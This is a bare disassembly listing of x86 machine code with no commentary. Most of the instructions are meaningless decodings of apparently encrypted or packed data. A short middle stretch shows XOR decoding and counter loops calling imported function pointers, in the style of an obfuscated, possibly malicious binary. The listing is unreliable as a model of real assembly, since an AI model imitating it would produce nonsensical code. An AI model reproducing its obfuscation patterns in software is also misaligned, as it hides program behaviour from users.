  40aa60:	(bad)  ds:0x9e903dde
  40aa66:	popf   
  40aa67:	popf   
  40aa68:	outs   dx,DWORD PTR ds:[esi]
  40aa69:	aam    0xa2
  40aa6b:	cwde   
  40aa6c:	iret   
  40aa6d:	xchg   edx,eax
  40aa6e:	xchg   DWORD PTR gs:[ebx-0x51],edi
  40aa72:	jns    0x40a9fd
  40aa74:	pusha  
  40aa75:	bound  edi,QWORD PTR [ecx+ecx*8+0x47]
  40aa79:	sbb    bl,ah
  40aa7b:	mov    fs,WORD PTR [ebx+esi*2+0x53d80233]
  40aa82:	retf   
  40aa83:	push   ds
  40aa84:	add    BYTE PTR [esp+ebp*1+0x5459fa72],bh
  40aa8b:	test   BYTE PTR [ebp+0x57],0xec
  40aa8f:	mov    ah,0x4a
  40aa91:	out    0xae,al
  40aa93:	adc    eax,0xd1f79555
  40aa98:	inc    BYTE PTR [esi-0x7b7779a6]
  40aa9e:	sbb    eax,0x549a0563
  40aaa3:	cmp    dl,BYTE PTR [ebp+0xfcb32b1]
  40aaa9:	ins    BYTE PTR es:[edi],dx
  40aaaa:	mov    eax,0x187e0cae
  40aaaf:	fwait
  40aab0:	aad    0xbf
  40aab2:	mov    bl,0xa4
  40aab4:	mov    al,ds:0xada0c1b4
  40aab9:	popa   
  40aaba:	xor    al,0x57
  40aabc:	push   ds
  40aabd:	ret    0x932
  40aac0:	cmp    ebp,DWORD PTR [ebx+0x17]
  40aac3:	ins    BYTE PTR es:[edi],dx
  40aac4:	pop    eax
  40aac5:	push   edx
  40aac6:	mul    dl
  40aac8:	sbb    eax,0xe7407765
  40aacd:	adc    ah,BYTE PTR [edx]
  40aacf:	sub    esi,ebx
  40aad1:	aaa    
  40aad2:	sub    BYTE PTR [ecx],bh
  40aad4:	or     BYTE PTR [esi-0x75dab55a],bh
  40aada:	pop    edi
  40aadb:	aam    0xf8
  40aadd:	adc    ebx,DWORD PTR [edx+0x4f]
  40aae0:	ss js  0x40ab42
  40aae3:	mov    ebp,0xdb77f3b0
  40aae8:	cmc    
  40aae9:	jge    0x917e9956
  40aaef:	push   edx
  40aaf0:	xchg   DWORD PTR [edx-0x71],esi
  40aaf3:	in     al,0xa8
  40aaf5:	jmp    0x674c4de1
  40aafa:	mov    ah,0xae
  40aafc:	sar    DWORD PTR [ebp-0x34],0x5e
  40ab00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab01:	add    al,0x66
  40ab03:	fimul  WORD PTR [eax+0x23]
  40ab06:	popf   
  40ab07:	mov    ds:0xa19b0ba7,eax
  40ab0c:	fst    DWORD PTR ds:0x8c342d2c
  40ab12:	bound  ebx,QWORD PTR [esi-0x42]
  40ab15:	mov    eax,0x150dffc3
  40ab1a:	(bad)  [ecx+0x3d]
  40ab1d:	sar    DWORD PTR [edi-0xa57e632],0x13
  40ab24:	mov    cl,0x30
  40ab26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab27:	inc    edx
  40ab28:	pushf  
  40ab29:	mov    gs,WORD PTR [esi]
  40ab2b:	cdq    
  40ab2c:	mov    ebp,0xbd66eff7
  40ab31:	aaa    
  40ab32:	ins    BYTE PTR es:[edi],dx
  40ab33:	out    dx,eax
  40ab34:	(bad)  
  40ab35:	jnp    0x40ab06
  40ab37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab38:	jb     0x40ab66
  40ab3a:	sub    eax,0xe79cabfd
  40ab3f:	mov    edx,0x1d4f6676
  40ab44:	mov    ebp,0xe850f6e4
  40ab49:	jo     0x40abb0
  40ab4b:	push   ebp
  40ab4c:	sub    eax,ecx
  40ab4e:	fdivr  DWORD PTR [ebx]
  40ab50:	les    ecx,FWORD PTR [esi+0x47]
  40ab53:	cdq    
  40ab54:	pop    ds
  40ab55:	xor    ecx,edi
  40ab57:	xchg   esi,eax
  40ab58:	push   ebx
  40ab59:	xbegin 0xbe2df317
  40ab5f:	jl     0x40aba4
  40ab61:	jno    0x40ab2a
  40ab63:	ret    0xb4f
  40ab66:	and    BYTE PTR [esi],0x57
  40ab69:	mov    esp,0xe3b64f78
  40ab6e:	dec    ebp
  40ab6f:	ja     0x40ab93
  40ab71:	sti    
  40ab72:	retf   0x51fb
  40ab75:	(bad)  
  40ab76:	lods   eax,DWORD PTR ds:[esi]
  40ab77:	es dec eax
  40ab79:	pop    es
  40ab7a:	jge    0x40abab
  40ab7c:	mov    edx,0xa1b44477
  40ab81:	faddp  st(3),st
  40ab83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab84:	xchg   ecx,eax
  40ab85:	inc    edx
  40ab86:	std    
  40ab87:	inc    ecx
  40ab88:	sbb    BYTE PTR [ecx+0xa5d6f79],al
  40ab8e:	add    eax,0xea6a7094
  40ab93:	repz aaa 
  40ab95:	rol    DWORD PTR [edi],1
  40ab97:	clc    
  40ab98:	jmp    0x45a89a10
  40ab9d:	adc    ebp,esi
  40ab9f:	arpl   WORD PTR [eax+0x427249b9],di
  40aba5:	pusha  
  40aba6:	mov    ch,0xd6
  40aba8:	(bad)  
  40aba9:	adc    al,0xaa
  40abab:	jle    0x40abcc
  40abad:	lds    esi,FWORD PTR [edi-0x55]
  40abb0:	mov    edx,0xe8187232
  40abb5:	xchg   dh,bl
  40abb7:	ret    0x8d46
  40abba:	jne    0x40ac2c
  40abbc:	jae    0x40ab73
  40abbe:	inc    ebp
  40abbf:	cmp    al,0xb4
  40abc1:	fld    TBYTE PTR [edx]
  40abc3:	and    cl,bl
  40abc5:	fcom   DWORD PTR [edx-0x5cf940db]
  40abcb:	sub    al,0x56
  40abcd:	inc    ebx
  40abce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abcf:	(bad)  
  40abd0:	stc    
  40abd1:	pop    esi
  40abd2:	sub    BYTE PTR [esi-0xb],0xb0
  40abd6:	fimul  DWORD PTR [ecx-0x1636b581]
  40abdc:	fld    QWORD PTR [edx-0x68]
  40abdf:	fisttp DWORD PTR [eax]
  40abe1:	(bad)  
  40abe2:	leave  
  40abe3:	sbb    edi,DWORD PTR [edi]
  40abe5:	mov    dh,0x8
  40abe7:	clc    
  40abe8:	fld    DWORD PTR [edx]
  40abea:	add    DWORD PTR [edi+esi*8],0x3616d1d6
  40abf1:	js     0x40ac16
  40abf3:	inc    eax
  40abf4:	jmp    0x6c2:0x7e403468
  40abfb:	push   0xb1405f65
  40ac00:	xor    edx,eax
  40ac02:	xor    DWORD PTR ds:0x42fcf5,0x42e70f
  40ac0c:	add    edx,ecx
  40ac0e:	mov    DWORD PTR ds:0x42e703,0x189b
  40ac18:	cmp    edi,edx
  40ac1a:	mov    DWORD PTR ds:0x42fcdd,0x36a4
  40ac24:	jb     0x40d88a
  40ac2a:	mov    edx,DWORD PTR [ebp-0x28]
  40ac2d:	sbb    DWORD PTR ds:0x42fd7e,ebx
  40ac33:	mov    edi,DWORD PTR [ebp-0x4]
  40ac36:	xor    edx,eax
  40ac38:	sub    DWORD PTR ds:0x42fcf5,edx
  40ac3e:	xor    edi,eax
  40ac40:	mov    DWORD PTR ds:0x42e6f7,0x1f
  40ac4a:	cmp    DWORD PTR ds:0x42e6f7,0x0
  40ac51:	je     0x40acfa
  40ac57:	cmp    DWORD PTR ds:0x42e6f7,0x2e
  40ac5e:	jne    0x40ac7d
  40ac64:	push   DWORD PTR [ebp-0xc]
  40ac67:	push   0x42e23d
  40ac6c:	push   DWORD PTR [ebp-0x24]
  40ac6f:	push   0x691a
  40ac74:	push   DWORD PTR [ebp-0x10]
  40ac77:	call   DWORD PTR ds:0x42e2f3
  40ac7d:	mov    ebx,DWORD PTR ds:0x42e6f7
  40ac83:	dec    ebx
  40ac84:	mov    DWORD PTR ds:0x42e6f7,ebx
  40ac8a:	jmp    0x40ac4a
  40ac8f:	and    DWORD PTR ds:0x42e128,0x0
  40ac99:	jmp    0x40acad
  40ac9e:	xor    ebx,ebx
  40aca0:	or     ebx,DWORD PTR ds:0x42e128
  40aca6:	inc    ebx
  40aca7:	mov    DWORD PTR ds:0x42e128,ebx
  40acad:	cmp    DWORD PTR ds:0x42e128,0x1a
  40acb4:	jae    0x40acfa
  40acba:	cmp    DWORD PTR ds:0x42e128,0xc
  40acc1:	jne    0x40acd5
  40acc7:	push   0x2dd0
  40accc:	push   DWORD PTR [ebp-0x14]
  40accf:	call   DWORD PTR ds:0x42e2f7
  40acd5:	cmp    DWORD PTR ds:0x42e128,0xb
  40acdc:	jne    0x40acef
  40ace2:	mov    ebx,DWORD PTR ds:0x42e128
  40ace8:	inc    ebx
  40ace9:	mov    DWORD PTR ds:0x42e128,ebx
  40acef:	jmp    0x40ac9e
  40acf4:	adc    ebx,0x2885
  40acfa:	add    edi,ecx
  40acfc:	sbb    ebx,0x5c75
  40ad02:	add    edx,ecx
  40ad04:	imul   edx,edi
  40ad07:	sub    ebx,DWORD PTR ds:0x42e134
  40ad0d:	mov    edi,DWORD PTR [ebp-0x8]
  40ad10:	mov    DWORD PTR ds:0x42fce1,0x13
  40ad1a:	cmp    DWORD PTR ds:0x42fce1,0x0
  40ad21:	je     0x40ad54
  40ad27:	cmp    DWORD PTR ds:0x42fce1,0x14
  40ad2e:	jne    0x40ad42
  40ad34:	push   DWORD PTR [ebp-0x28]
  40ad37:	push   0x42fd01
  40ad3c:	call   DWORD PTR ds:0x42e54b
  40ad42:	mov    ebx,DWORD PTR ds:0x42fce1
  40ad48:	dec    ebx
  40ad49:	mov    DWORD PTR ds:0x42fce1,ebx
  40ad4f:	jmp    0x40ad1a
  40ad54:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad57:	sub    ebx,edi
  40ad59:	cmp    ebx,edx
  40ad5b:	ja     0x40ad6d
  40ad61:	mov    edx,DWORD PTR [ebp-0x4]
  40ad64:	xor    edx,eax
  40ad66:	add    edx,ecx
  40ad68:	jmp    0x40c0fc
  40ad6d:	mov    edx,DWORD PTR [ebp-0x2c]
  40ad70:	mov    edi,DWORD PTR [ebp-0x4]
  40ad73:	xor    edx,eax
  40ad75:	xor    edi,eax
  40ad77:	add    edi,ecx
  40ad79:	add    edx,ecx
  40ad7b:	imul   edx,edi
  40ad7e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad81:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad84:	sub    ebx,edi
  40ad86:	cmp    ebx,edx
  40ad88:	ja     0x40ad96
  40ad8e:	mov    edx,DWORD PTR [ebp-0x28]
  40ad91:	jmp    0x40c0ee
  40ad96:	mov    edx,DWORD PTR [ebp-0x30]
  40ad99:	mov    edi,DWORD PTR [ebp-0x4]
  40ad9c:	xor    edx,eax
  40ad9e:	xor    edi,eax
  40ada0:	add    edi,ecx
  40ada2:	jmp    0x40b160
  40ada7:	xor    BYTE PTR [eax+eiz*4],bl
  40adaa:	mov    bh,0x6c
  40adac:	mov    bl,0xc7
  40adae:	jae    0x40ae09
  40adb0:	jg     0x40ad82
  40adb2:	ja     0x40ad95
  40adb4:	xchg   ecx,eax
  40adb5:	xor    al,0x19
  40adb7:	add    edi,ebp
  40adb9:	jo     0x40ae2b
  40adbb:	lahf   
  40adbc:	jge    0x40ae2e
  40adbe:	jo     0x40ad49
  40adc0:	xchg   ecx,eax
  40adc1:	xchg   edx,eax
  40adc2:	add    BYTE PTR [eax-0x75e62892],bh
  40adc8:	enter  0xe52,0xb3
  40adcc:	test   eax,0x3f87aff9
  40add1:	mov    esp,0xc2415fed
  40add6:	fsubr  DWORD PTR ss:[ebx-0x5e8f7d64]
  40addd:	mov    ah,0xc6
  40addf:	mov    al,0x18
  40ade1:	addr16 pop edx
  40ade3:	pop    ebp
  40ade4:	lods   al,BYTE PTR ds:[esi]
  40ade5:	mov    bl,0x95
  40ade7:	xchg   ecx,eax
  40ade8:	cmp    edx,edx
  40adea:	cmc    
  40adeb:	clc    
  40adec:	call   0xb9a87f1d
  40adf1:	push   esp
  40adf2:	ds jl  0x40adbb
  40adf5:	lds    esp,FWORD PTR [edx]
  40adf7:	lods   eax,DWORD PTR ds:[esi]
  40adf8:	push   ds
  40adf9:	or     eax,0xa8bdba40
  40adfe:	mov    ds,WORD PTR [edi-0x245aa7b3]
  40ae04:	inc    ebx
  40ae05:	aaa    
  40ae06:	es push es
  40ae08:	scas   al,BYTE PTR es:[edi]
  40ae09:	cmp    DWORD PTR [ecx+edi*8],0x2a
  40ae0d:	add    DWORD PTR [edi],edx
  40ae0f:	ret    
  40ae10:	popf   
  40ae11:	out    dx,al
  40ae12:	push   ecx
  40ae13:	jb     0x40ada3
  40ae15:	fild   WORD PTR [ebx]
  40ae17:	sub    ecx,DWORD PTR [ecx+0x47205328]
  40ae1d:	outs   dx,BYTE PTR ds:[esi]
  40ae1e:	dec    bp
  40ae20:	mov    ecx,0x6dc38403
  40ae25:	sub    BYTE PTR [edx-0x51],bh
  40ae28:	ret    0x3a2c
  40ae2b:	inc    ecx
  40ae2c:	sub    BYTE PTR [edi],dh
  40ae2e:	mov    ah,0xd
  40ae30:	xchg   edi,eax
  40ae31:	das    
  40ae32:	dec    esp
  40ae33:	addr16 jnp 0x40adff
  40ae36:	mov    ecx,0x3b42273c
  40ae3b:	imul   esp,DWORD PTR [esi-0x6f],0x77
  40ae3f:	rol    ebp,cl
  40ae41:	cmp    bh,BYTE PTR [edi]
  40ae43:	repnz mov ch,0x37
  40ae46:	cmp    al,BYTE PTR [edx-0x1553f435]
  40ae4c:	cmp    bh,dl
  40ae4e:	repz jb 0x40ae2c
  40ae51:	popf   
  40ae52:	cli    
  40ae53:	loop   0x40ae23
  40ae55:	xchg   ebp,eax
  40ae56:	mov    DWORD PTR cs:[ecx+0x181c3a06],eax
  40ae5d:	xlat   BYTE PTR ds:[ebx]
  40ae5e:	xlat   BYTE PTR ds:[ebx]
  40ae5f:	pop    ds
  40ae60:	pop    eax
  40ae61:	mov    es:0x6647615b,al
  40ae67:	fld    st(5)
  40ae69:	mov    ebp,0x45d61514
  40ae6e:	in     al,dx
  40ae6f:	cdq    
  40ae70:	(bad)  [edi+ebx*8-0x607f3279]
  40ae77:	and    al,0x1
  40ae79:	or     dh,dh
  40ae7b:	or     eax,0x23b44a74
  40ae80:	ror    BYTE PTR [eax+0x30616603],1
  40ae86:	push   ss
  40ae87:	cli    
  40ae88:	or     ebx,edi
  40ae8a:	or     al,0xa9
  40ae8c:	mov    al,ds:0x1ad2f467
  40ae91:	xlat   BYTE PTR ds:[ebx]
  40ae92:	push   esi
  40ae93:	aad    0xdb
  40ae95:	je     0x40aeee
  40ae97:	sahf   
  40ae98:	rol    BYTE PTR [ebp-0x59],cl
  40ae9b:	inc    edx
  40ae9c:	dec    edx
  40ae9d:	sbb    BYTE PTR [ecx-0x6c2f8d04],ch
  40aea3:	push   edx
  40aea4:	cld    
  40aea5:	ret    0xc515
  40aea8:	in     al,dx
  40aea9:	push   edx
  40aeaa:	add    DWORD PTR [edx-0x2e],ecx
  40aead:	dec    edi
  40aeae:	scas   al,BYTE PTR es:[edi]
  40aeaf:	dec    esp
  40aeb0:	cmp    DWORD PTR [eax],0xffffffcb
  40aeb3:	dec    ebp
  40aeb4:	and    BYTE PTR [esi+0x440c4a1a],al
  40aeba:	push   esi
  40aebb:	scas   al,BYTE PTR es:[edi]
  40aebc:	add    DWORD PTR [esi],esi
  40aebe:	sub    DWORD PTR [ebp-0x7f],ebx
  40aec1:	and    ecx,DWORD PTR [edx+0x1b]
  40aec4:	xchg   edx,eax
  40aec5:	jne    0x40af02
  40aec7:	aam    0xcc
  40aec9:	add    DWORD PTR [esi-0x3df25605],eax
  40aecf:	mov    edx,0xfc6bfeef
  40aed4:	ss dec ebp
  40aed6:	std    
  40aed7:	popf   
  40aed8:	mov    ecx,0xbdb59e5
  40aedd:	sbb    al,0x2d
  40aedf:	sub    eax,0xe720fff3
  40aee4:	sbb    BYTE PTR [ecx+eiz*2-0x5adba862],ah
  40aeeb:	or     BYTE PTR [esi],0x23
  40aeee:	mov    DWORD PTR [edx+0xd],eax
  40aef1:	into   
  40aef2:	xchg   DWORD PTR [ebx-0x71588965],ebp
  40aef8:	push   ecx
  40aef9:	xchg   esp,eax
  40aefa:	fwait
  40aefb:	mov    ebx,0xbdc3c2af
  40af00:	stos   BYTE PTR es:[edi],al
  40af01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af02:	mov    ch,bh
  40af04:	les    ecx,FWORD PTR [eax]
  40af06:	inc    ebx
  40af07:	xor    dh,al
  40af09:	pop    esi
  40af0a:	shl    cl,0xf2
  40af0d:	cmc    
  40af0e:	pop    edx
  40af0f:	lds    ecx,FWORD PTR [ebp-0x65]
  40af12:	and    eax,0x2801b86
  40af17:	and    eax,DWORD PTR [ebp+0x6a]
  40af1a:	retf   0x24ef
  40af1d:	push   esp
  40af1e:	inc    edx
  40af1f:	(bad)  
  40af20:	ficom  WORD PTR [ebp-0x659be8f9]
  40af26:	(bad)  
  40af27:	ins    DWORD PTR es:[edi],dx
  40af28:	xlat   BYTE PTR ds:[ebx]
  40af29:	repnz sar BYTE PTR [eax+0x68fbfc7b],0xfc
  40af31:	pop    edx
  40af32:	cmp    BYTE PTR [ebx-0x53],dl
  40af35:	dec    ebp
  40af36:	adc    ebx,ebx
  40af38:	popf   
  40af39:	add    ch,BYTE PTR [esi-0x37]
  40af3c:	xchg   esi,eax
  40af3d:	pusha  
  40af3e:	jo     0x40af79
  40af40:	leave  
  40af41:	outs   dx,DWORD PTR ds:[esi]
  40af42:	test   BYTE PTR [ecx+0x2c],dl
  40af45:	pop    ebx
  40af46:	fsub   DWORD PTR [esi+0x20cfb0cb]
  40af4c:	rol    DWORD PTR [ebx+0x31ad082d],cl
  40af52:	adc    bl,BYTE PTR [eax-0x65]
  40af55:	xchg   edx,eax
  40af56:	jmp    0x2345:0x42cd9fdc
  40af5d:	ds mov dh,0x2a
  40af60:	sbb    BYTE PTR [eax+0x2a],cl
  40af63:	push   cs
  40af64:	idiv   BYTE PTR [eax]
  40af66:	or     DWORD PTR es:[edi],ebp
  40af69:	data16 cmc 
  40af6b:	js     0x40af00
  40af6d:	or     eax,0xfeabc21d
  40af72:	or     BYTE PTR [esi],cl
  40af74:	aad    0xd6
  40af76:	lahf   
  40af77:	loop   0x40af39
  40af79:	sbb    eax,0x7042e71a
  40af7e:	pusha  
  40af7f:	cld    
  40af80:	sbb    DWORD PTR [edi-0x2f2e7ffd],ebx
  40af86:	dec    ebx
  40af87:	rcr    BYTE PTR [edi+0x32e28bfc],1
  40af8d:	and    eax,DWORD PTR [edx-0x43129484]
  40af93:	mov    BYTE PTR [ebx],0xbc
  40af96:	(bad)  [eax+0x20]
  40af99:	xor    al,0x1c
  40af9b:	pop    esp
  40af9c:	mov    ds:0x6e36cf40,al
  40afa1:	adc    eax,esi
  40afa3:	and    al,0xb1
  40afa5:	retf   
  40afa6:	cmc    
  40afa7:	(bad)  
  40afa8:	adc    eax,0xf815d6d6
  40afad:	fs inc ebp
  40afaf:	xor    edi,edi
  40afb1:	retf   0x52d6
  40afb4:	push   esi
  40afb5:	std    
  40afb6:	jno    0x40b00e
  40afb8:	push   esp
  40afb9:	rcr    DWORD PTR [eax],0x87
  40afbc:	fist   WORD PTR [edx+eax*1-0x17c23f68]
  40afc3:	dec    ebp
  40afc4:	cmp    ecx,DWORD PTR [edx]
  40afc6:	mov    esp,0x75abb034
  40afcb:	push   edi
  40afcc:	pop    edx
  40afcd:	push   edi
  40afce:	or     al,BYTE PTR [edi-0x538178e3]
  40afd4:	nop
  40afd5:	push   esp
  40afd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afd7:	pop    eax
  40afd8:	pop    ds
  40afd9:	sahf   
  40afda:	stos   DWORD PTR es:[edi],eax
  40afdb:	add    DWORD PTR [ebx+0x66],edx
  40afde:	arpl   WORD PTR [edx+0x4f],cx
  40afe1:	clc    
  40afe2:	xor    ah,dh
  40afe4:	loop   0x40af9d
  40afe6:	enter  0xef9e,0x8e
  40afea:	mov    cl,0x2
  40afec:	pop    es
  40afed:	mov    bl,0x4a
  40afef:	fld    DWORD PTR [eax]
  40aff1:	xchg   esp,eax
  40aff2:	cld    
  40aff3:	jno    0x40b043
  40aff5:	pop    ds
  40aff6:	scas   al,BYTE PTR es:[edi]
  40aff7:	cmp    edi,esp
  40aff9:	jne    0x40b040
  40affb:	stos   BYTE PTR es:[edi],al
  40affc:	icebp  
  40affd:	dec    eax
  40affe:	aam    0xca
  40b000:	inc    edi
  40b001:	cwde   
  40b002:	cs lahf 
  40b004:	mov    al,dl
  40b006:	dec    ebx
  40b007:	pop    ss
  40b008:	cmp    eax,0xe91b12a7
  40b00d:	hlt    
  40b00e:	ror    DWORD PTR [ecx*2+0x3987f1c9],cl
  40b015:	sahf   
  40b016:	pop    ebx
  40b017:	popa   
  40b018:	adc    BYTE PTR [ebx+0xa],dl
  40b01b:	jbe    0x40b078
  40b01d:	mov    edi,0x15d211d9
  40b022:	mov    edx,ebp
  40b024:	aam    0x6a
  40b026:	cmc    
  40b027:	enter  0x6057,0xf0
  40b02b:	ret    0x9d59
  40b02e:	sbb    BYTE PTR ds:0xc568d67e,dl
  40b034:	mov    ebp,0x5332028d
  40b039:	scas   eax,DWORD PTR es:[edi]
  40b03a:	mov    bh,0xa7
  40b03c:	add    DWORD PTR [ebp-0x1c],ecx
  40b03f:	aam    0x1a
  40b041:	int3   
  40b042:	mov    cl,BYTE PTR [ecx]
  40b044:	adc    esp,edx
  40b046:	ret    0x60f9
  40b049:	lods   al,BYTE PTR ds:[esi]
  40b04a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b04b:	jmp    0xa9ab5b9a
  40b050:	aam    0xe1
  40b052:	cmp    cl,ah
  40b054:	dec    esp
  40b055:	ss or  dh,al
  40b058:	jbe    0x40afe4
  40b05a:	push   ecx
  40b05b:	jg     0x40aff6
  40b05d:	sbb    eax,0x6814061e
  40b062:	shl    BYTE PTR [edx-0x5f3d877a],0x4e
  40b069:	pop    edx
  40b06a:	les    edi,FWORD PTR [eax+0x4871f806]
  40b070:	nop
  40b071:	fldenv [edx+0x5b]
  40b074:	push   edx
  40b075:	or     esi,edi
  40b077:	mov    ebx,0xf96f1913
  40b07c:	hlt    
  40b07d:	loop   0x40b013
  40b07f:	adc    dh,BYTE PTR [ecx+0xe]
  40b082:	add    DWORD PTR [ebx+0x1c68531a],ecx
  40b088:	xchg   BYTE PTR [ebx],al
  40b08a:	lods   al,BYTE PTR ds:[esi]
  40b08b:	aad    0xbf
  40b08d:	sbb    edi,DWORD PTR [edx]
  40b08f:	cmp    bl,BYTE PTR [ebx+0x361734f2]
  40b095:	add    bh,ah
  40b097:	sub    BYTE PTR [ecx],0x55
  40b09a:	jne    0x40b11a
  40b09c:	test   BYTE PTR [edi-0x23],ah
  40b09f:	push   esi
  40b0a0:	xchg   edx,eax
  40b0a1:	ins    BYTE PTR es:[edi],dx
  40b0a2:	in     eax,dx
  40b0a3:	cmp    BYTE PTR [esi],0xe0
  40b0a6:	mov    esp,0xccd01f1f
  40b0ab:	inc    edi
  40b0ac:	mov    cl,0xf9
  40b0ae:	int    0x6f
  40b0b0:	mov    bl,BYTE PTR [ecx-0x6449c1db]
  40b0b6:	mov    cl,0xe5
  40b0b8:	jne    0x40b042
  40b0ba:	jecxz  0x40b053
  40b0bc:	adc    al,0xda
  40b0be:	push   ss
  40b0bf:	fldcw  WORD PTR [edi-0x58c6c7bc]
  40b0c5:	xchg   esp,eax
  40b0c6:	xlat   BYTE PTR ds:[ebx]
  40b0c7:	in     eax,0x12
  40b0c9:	sar    dl,0x84
  40b0cc:	jmp    0x40b09e
  40b0ce:	mov    ebx,0x964e41d6
  40b0d3:	loope  0x40b0cb
  40b0d5:	xchg   DWORD PTR [esi-0x43f00823],esi
  40b0db:	adc    BYTE PTR [eax],ch
  40b0dd:	cmp    BYTE PTR [esp+esi*8+0x30],ah
  40b0e1:	pop    ss
  40b0e2:	and    DWORD PTR [esi],ecx
  40b0e4:	xlat   BYTE PTR ds:[ebx]
  40b0e5:	push   edx
  40b0e6:	xchg   edx,eax
  40b0e7:	xchg   ebp,eax
  40b0e8:	adc    bh,BYTE PTR [ebx+0x48]
  40b0eb:	loop   0x40b0fd
  40b0ed:	dec    eax
  40b0ee:	es pop edx
  40b0f0:	add    BYTE PTR [edx],ah
  40b0f2:	in     al,0x26
  40b0f4:	scas   al,BYTE PTR es:[edi]
  40b0f5:	out    dx,al
  40b0f6:	sbb    ch,BYTE PTR [ebx+0x5bd94470]
  40b0fc:	(bad)  
  40b0fd:	mov    ds:0xedb58572,eax
  40b102:	or     al,0x65
  40b104:	imul   ecx,ebx,0x36
  40b107:	pop    ax
  40b109:	push   ds
  40b10a:	sub    al,0x19
  40b10c:	bound  edi,QWORD PTR [esi-0x1604b9a4]
  40b112:	add    edi,eax
  40b114:	xor    al,0x77
  40b116:	into   
  40b117:	sti    
  40b118:	xchg   ebp,eax
  40b119:	lods   al,BYTE PTR ds:[esi]
  40b11a:	sbb    eax,0x4ec4f8b8
  40b11f:	pop    esp
  40b120:	or     ebx,DWORD PTR [edi]
  40b122:	aaa    
  40b123:	es leave 
  40b125:	in     eax,dx
  40b126:	aas    
  40b127:	mov    edi,0x25829e7f
  40b12c:	popf   
  40b12d:	aas    
  40b12e:	sahf   
  40b12f:	mov    dh,0x61
  40b131:	or     eax,0x629d21f0
  40b136:	and    dl,dl
  40b138:	test   al,0xbb
  40b13a:	dec    ecx
  40b13b:	ss test eax,0x98e16ca3
  40b141:	and    edi,DWORD PTR [esi+0x3]
  40b144:	push   es
  40b145:	les    edx,FWORD PTR [esi]
  40b147:	or     eax,0x24b0124b
  40b14c:	out    dx,eax
  40b14d:	mov    edx,0x3c8e3abf
  40b152:	push   esp
  40b153:	popf   
  40b154:	pop    esp
  40b155:	mov    BYTE PTR [ebp-0x354d783d],ch
  40b15b:	mov    al,0xfe
  40b15d:	frstor [eax]
  40b15f:	adc    eax,0xb9e9d103
  40b164:	add    eax,DWORD PTR [eax]
  40b166:	add    dl,dl
  40b168:	jne    0x40b1a1
  40b16a:	sub    esi,DWORD PTR [ebx-0x188a2d97]
  40b170:	retf   0xa792
  40b173:	into   
  40b174:	aaa    
  40b175:	and    esp,edi
  40b177:	mov    ds:0x9f7070fa,al
  40b17c:	jge    0x40b1ee
  40b17e:	jo     0x40b18d
  40b180:	aam    0xf8
  40b182:	dec    esi
  40b183:	mov    ds:0x836b366,eax
  40b188:	mov    ecx,0x8a1ffd05
  40b18d:	retf   
  40b18e:	ins    DWORD PTR es:[edi],dx
  40b18f:	adc    al,0x3
  40b191:	push   cs
  40b192:	mov    ebx,0xaf5fb2e5
  40b197:	jg     0x40b119
  40b199:	push   edx
  40b19a:	dec    esi
  40b19b:	mov    esp,0x2f0943cd
  40b1a0:	push   0x849d033b
  40b1a5:	jo     0x40b15b
  40b1a7:	or     DWORD PTR [eax-0x10279691],esp
  40b1ad:	push   esp
  40b1ae:	dec    edx
  40b1af:	neg    BYTE PTR [eax+0x76dc5c50]
  40b1b5:	fldenv [eax-0x5b52b3ad]
  40b1bb:	and    BYTE PTR [eax+eiz*2-0x6ecb9658],0xa8
  40b1c3:	inc    ebx
  40b1c4:	sbb    al,0xa9
  40b1c6:	and    BYTE PTR [esi],0x80
  40b1c9:	outs   dx,BYTE PTR ds:[esi]
  40b1ca:	and    al,0x3e
  40b1cc:	lahf   
  40b1cd:	fs lahf 
  40b1cf:	(bad)  
  40b1d0:	push   edx
  40b1d1:	mov    al,0xef
  40b1d3:	add    ebx,edx
  40b1d5:	std    
  40b1d6:	jmp    0x21ef:0x41557126
  40b1dd:	(bad)  
  40b1de:	mov    al,ds:0x329f04c8
  40b1e3:	fistp  WORD PTR [edi-0x71d729c5]
  40b1e9:	lods   al,BYTE PTR ds:[esi]
  40b1ea:	pop    esi
  40b1eb:	retf   
  40b1ec:	fs cdq 
  40b1ee:	ret    0x7a41
  40b1f1:	sub    DWORD PTR [esi],esp
  40b1f3:	xchg   DWORD PTR ss:[esi+0x26dc29ec],esi
  40b1fa:	loop   0x40b20c
  40b1fc:	(bad)  es:[esi]
  40b1ff:	popf   
  40b200:	in     al,dx
  40b201:	popa   
  40b202:	ffreep st(6)
  40b204:	mov    esi,0x4853bb6f
  40b209:	push   0x8471b63a
  40b20e:	xor    BYTE PTR [eax],0x92
  40b211:	pop    esp
  40b212:	std    
  40b213:	pop    esp
  40b214:	(bad)  
  40b215:	xchg   ebx,eax
  40b216:	dec    edi
  40b217:	cdq    
  40b218:	add    al,bh
  40b21a:	sub    al,0xa5
  40b21c:	jae    0x40b265
  40b21e:	jmp    0x6b1c1263
  40b223:	pop    ebx
  40b224:	pop    edx
  40b225:	scas   eax,DWORD PTR es:[edi]
  40b226:	inc    eax
  40b227:	sbb    al,0xd7
  40b229:	hlt    
  40b22a:	mov    BYTE PTR [ecx+ecx*1-0x6080bc82],ch
  40b231:	(bad)  
  40b232:	clc    
  40b233:	loop   0x40b24b
  40b235:	push   eax
  40b236:	pop    ds
  40b237:	outs   dx,DWORD PTR ds:[esi]
  40b238:	mov    dh,0x27
  40b23a:	sub    al,0x73
  40b23c:	aam    0xbf
  40b23e:	stos   DWORD PTR es:[edi],eax
  40b23f:	jg     0x40b235
  40b241:	mov    ch,0x68
  40b243:	dec    ecx
  40b244:	and    eax,0xfd85c837
  40b249:	loope  0x40b25f
  40b24b:	jmp    0x39d:0x78acfad1
  40b252:	push   eax
  40b253:	shl    DWORD PTR [esi],0x4d
  40b256:	mov    esi,0x6ceb7abb
  40b25b:	xlat   BYTE PTR ds:[ebx]
  40b25c:	jmp    0x3d21:0x723e0452
  40b263:	or     al,0x3c
  40b265:	push   es
